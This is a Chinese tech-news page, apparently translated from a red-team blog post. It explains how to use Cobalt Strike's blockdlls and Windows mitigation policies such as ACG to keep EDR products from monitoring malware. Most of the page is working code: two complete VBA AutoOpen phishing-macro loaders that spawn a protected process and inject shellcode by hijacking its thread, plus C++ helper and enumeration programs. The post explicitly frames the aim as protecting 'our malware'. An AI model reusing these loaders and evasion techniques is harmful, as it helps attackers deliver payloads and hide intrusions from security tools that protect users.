<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>如何利用blockdlls和ACG保護你的惡意軟件 | 极客快訊</title><meta property="og:title" content="如何利用blockdlls和ACG保護你的惡意軟件 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><meta property="article:published_time" content="2020-10-29T21:08:07+08:00"><meta property="article:modified_time" content="2020-10-29T21:08:07+08:00"><meta name=Keywords content><meta name=description content="如何利用blockdlls和ACG保護你的惡意軟件"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/8a7e234.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>如何利用blockdlls和ACG保護你的惡意軟件</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><div><p>在Cobalt Strike的近期更新中，加入了blockdlls命令，它可在攻擊者派生子進程時阻止第三方DLL的加載。這就使安全產品在進程創建時無法通過DLL加載進行監控和可疑情況上報。</p><p>在進行過幾次內部原理的討論後，我覺得有必要寫一篇文章展示其用法和背後的原理，如何用它來保護我們的惡意軟件，阻止安全軟件的監控。</p><h1>blockdlls</h1><p>blockdlls是在Cobalt Strike的3.14版本中出現的，用於保護派生的子進程不受第三方DLL的干擾。使用這個功能很簡單，我們只需在一個活動的會話中使用blockdlls命令，然後派生一個子進程（使用spawn命令）：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065><p class=pgc-img-caption></p></div><p>一旦我們的子進程出現，我們可以在ProcessHacker中看到類似語句：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d8c2ff4b8c7c41cda836e41d40568560><p class=pgc-img-caption></p></div><p>此時如果一個沒有被微軟簽名的DLL試圖加載到進程中，就會出現一個很詳細的錯誤，例如：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f29493fb053a4347b0efd5a1f08a10c6><p class=pgc-img-caption></p></div><p>那麼，Cobalt Strike是如何實現這一功能的呢？如果我們搜索CS beacon的二進制文件，你會看到對UpdateProcThreadAttribute的引用：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/058beecd2b3947208a5dfc093d0d0413><p class=pgc-img-caption></p></div><p>上圖中，0x20007的Attribute參數實際上和PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY有關，而0x100000000000的值解析為PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON。可以看出，Cobalt Strike調用了CreateProcessAPI，其中涉及一個STARTUPINFOEX結構體，該結構體包含一個安全策略，在這種情況下，該策略阻止了非微軟簽名的DLL加載。</p><p>如果我們想自己重現，可以利用以下代碼：</p><pre>#include &lt;Windows.h&gt;int main(){ STARTUPINFOEXA si; PROCESS_INFORMATION pi; SIZE_T size = 0; BOOL ret; // Required for a STARTUPINFOEXA ZeroMemory(&amp;si, sizeof(si)); si.StartupInfo.cb = sizeof(STARTUPINFOEXA); si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT; // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size); // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc( GetProcessHeap(), 0, size ); // Initialise our list  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size); // Enable blocking of non-Microsoft signed DLLs DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON; // Assign our attribute UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, sizeof(policy), NULL, NULL); // Finally, create the process ret = CreateProcessA( NULL, (LPSTR)"C:\\Windows\\System32\\cmd.exe", NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), &amp;pi );}</pre><h1>進一步瞭解</h1><p>現在我們知道了Cobalt Strike如何實現該功能，但在滲透的某些階段這個功能並不能覆蓋，這就給了安全軟件可乘之機。讓我們看看一個常見的釣魚場景，我們試圖通過一個包含惡意宏的文檔來進行beacon植入：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ca04a0eb32ed4a3b9ee097335872396f><p class=pgc-img-caption></p></div><p>一般入侵流程中，在上圖紅色方框的部分，blockdlls無法生效，但在藍色方框中，我們可以看到由Cobalt Strike所派生的每個子進程都受到了“安全”策略的保護。這裡所面臨的風險是安全產品會將其DLL加載到遷移進程（這裡顯示為Internet Explorer），檢查其中是否有惡意活動。</p><p>不過，結合上述代碼和PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON選項，我們可以較好地解決這個問題。</p><pre>POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1000 ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, because... yolo) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(offset) result = WriteProcessMemory(pi.hProcess, alloc + offset, myByte, 1, ByVal 0&amp;) Next offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>如果使用正確，我們可以看到安全軟件所能檢測的階段減少了：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/3b4d25abb195478c9af753145099710e><p class=pgc-img-caption></p></div><p>那麼剩下的紅色階段呢？也還是有一些方法可以進行保護，例如，我們可以調用含有參數ProcessSignaturePolicy的SetMitigationPolicy，這也可以在運行時引入策略，也就是說，不需要通過CreateProcess重新執行。然而，很可能在VBA文件運行之前，某些DLL就已經加載到Word的地址空間中了，某些危險操作會增加被檢測到的機會。</p><h1>任意代碼保護</h1><p>在閱讀本文時，你可能沒聽過任意代碼保護（ACG）。這是Windows系統的另一個安全策略，它可以阻止內存代碼注入。</p><p>要查看這個策略的實際效果，先讓我們創建一個小程序，並嘗試使用SetMitigationPolicy添加ACG：</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;int main(){ STARTUPINFOEX si; DWORD oldProtection; PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy; ZeroMemory(&amp;policy, sizeof(policy)); policy.ProhibitDynamicCode = 1; void* mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } printf("[*] Now running SetProcessMitigationPolicy to apply PROCESS_MITIGATION_DYNAMIC_CODE_POLICY\n"); // Set our mitigation policy if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &amp;policy, sizeof(policy)) == false) { printf("[!] SetProcessMitigationPolicy failed\n"); return 0; } // Attempt to allocate RWX protected memory (this will fail) mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory"); // Let's also try a VirtualProtect to see if we can update an existing page to RWX if (!VirtualProtect(ntAllocateVirtualMemory, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProtection)) { printf("[!] Error updating NtAllocateVirtualMemory [%p] memory to RWX\n", ntAllocateVirtualMemory); } else { printf("[*] NtAllocateVirtualMemory [%p] memory updated to RWX\n", ntAllocateVirtualMemory); }}</pre><p>編譯並執行後，我們會看到如下語句：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/85ac869d8c6e4e1d88488b97a3599404><p class=pgc-img-caption></p></div><p>我們可以觀察到在SetProcessMitigationPolicy執行後，分配RWX內存頁失敗了。</p><p>為什麼要提起這個？因為我們確實看到了一些EDR DLL被注入的例子，例如，@Sektor7Net向我們展示了Crowdstrike Falcon中的某個DLL，它不受PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON的影響:</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ae2f5491a25b454d9e566308729de80a><p class=pgc-img-caption></p></div><p>但是，很多EDR產品都會做的一件事就是根據某些功能在用戶空間佈置hook（相關文章）。由於hook通常需要修改現有的可執行page，添加Trampoline，所以通常需要調用VirtualProtect來更新內存保護。如果我們移除它創建RWX內存頁的能力，就能迫使一個Microsoft簽名DLL加載失敗。</p><p>要在我們的VBA代碼中實現這一點，我們需要添加PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON選項，啟用這種保護：</p><pre>' POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON and PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON ' and PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1010 ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's and disallow dynamic code result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, as this isn't blocked from alloc outside the process (and ... yolo)) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For Offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(Offset) result = WriteProcessMemory(pi.hProcess, alloc + Offset, myByte, 1, ByVal 0&amp;) Next Offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>所以這對於保護我們正在派生的進程是很好的，但是如果當我們想將一些代碼注入一個已經被ACG保護的進程時呢？我聽到的一個常見的誤解是，我們無法將代碼注入到受ACG保護的進程中，我們還需要某種形式的可寫和可執行的內存。但實際上，ACG並不阻止遠程進程調用VirtuAllocEx等函數。</p><p>例如，如果我們使用一些簡單的shellcode去派生出cmd.exe，並將其注入到ACG保護的進程中：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24065b9494f84f0c932a071a31a58cc2><p class=pgc-img-caption></p></div><p>應該注意的是，Cobalt Strike的beacon目前無法使用這種方法，因為依賴向RWX分配和修改內存頁。我嘗試了一些不同的可擴展配置文件選項來解決這個問題（主要和userwx有關的選項），但目前看來不行。</p><h1>操作事項</h1><p>現在，我們要將這些策略進行整合。例如，在開始生成任意進程時，可以用PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON進行保護。</p><p>我們還希望用某個策略枚舉出所有的進程。通過Powershell命令Get-ProcessMigration，我們可以知道註冊表中定義的所有策略，而且我們也知道還有其他方法可以對進程進行保護，例如setMigrationPolicy API，此外還可以通過CreateProcessA生成任意進程。</p><p>為了確保正確地分析每個進程，我們需要一個簡單的工具，如下工具將使用GetProcessMitigationPolicy來識別策略的分配：</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;processthreadsapi.h&gt;bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);void GetProtection(int pid, const char *exe) { PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy; PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signaturePolicy; HANDLE pHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid); if (pHandle == INVALID_HANDLE_VALUE) { printf("[!] Error opening handle to %d\n", pid); return; } // Actually retrieve the mitigation policy for ACG if (!GetProcessMitigationPolicy(pHandle, ProcessDynamicCodePolicy, &amp;dynamicCodePolicy, sizeof(dynamicCodePolicy))) { printf("[!] Could not enum PID %d [%d]\n", pid, GetLastError()); return; } if (dynamicCodePolicy.ProhibitDynamicCode) { printf("[%s] - ProhibitDynamicCode\n", exe); } if (dynamicCodePolicy.AllowRemoteDowngrade) { printf("[%s] - AllowRemoteDowngrade\n", exe); } if (dynamicCodePolicy.AllowThreadOptOut) { printf("[%s] - AllowThreadOptOut\n", exe); } // Retrieve mitigation policy for loading arbitrary DLLs if (!GetProcessMitigationPolicy(pHandle, ProcessSignaturePolicy, &amp;signaturePolicy, sizeof(signaturePolicy))) { printf("Could not enum PID %d\n", pid); return; } if (signaturePolicy.AuditMicrosoftSignedOnly) { printf("[%s] AuditMicrosoftSignedOnly\n", exe); } if (signaturePolicy.AuditStoreSignedOnly) { printf("[%s] - AuditStoreSignedOnly\n", exe); } if (signaturePolicy.MicrosoftSignedOnly) { printf("[%s] - MicrosoftSignedOnly\n", exe); } if (signaturePolicy.MitigationOptIn) { printf("[%s] - MitigationOptIn\n", exe); } if (signaturePolicy.StoreSignedOnly) { printf("[%s] - StoreSignedOnly\n", exe); }}int main(){ HANDLE snapshot; PROCESSENTRY32 ppe; HANDLE accessToken; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;accessToken)) { printf("[!] Error opening process token\n"); return 1; } // Provide ourself with SeDebugPrivilege to increase our enumeration chances SetPrivilege(accessToken, SE_DEBUG_NAME); // Prepare handle to enumerate running processes snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf("[!] Error: CreateToolhelp32Snapshot\n"); return 2; } ppe.dwSize = sizeof(PROCESSENTRY32); Process32First(snapshot, &amp;ppe); do { // Enumerate process mitigations GetProtection(ppe.th32ProcessID, ppe.szExeFile); } while (Process32Next(snapshot, &amp;ppe));}bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) { TOKEN_PRIVILEGES tp; LUID luid; if (!LookupPrivilegeValue( NULL, lpszPrivilege, &amp;luid)) { printf("[!] LookupPrivilegeValue error: %u\n", GetLastError()); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges( hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) { printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError()); return FALSE; } return TRUE;}</pre><p>經過我對Windows 10的測試，發現已有幾個進程應用了安全策略：</p><div class=pgc-img><img alt=如何利用blockdlls和ACG保護你的惡意軟件 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/0942282201f74b329b2692a6ac84cc21><p 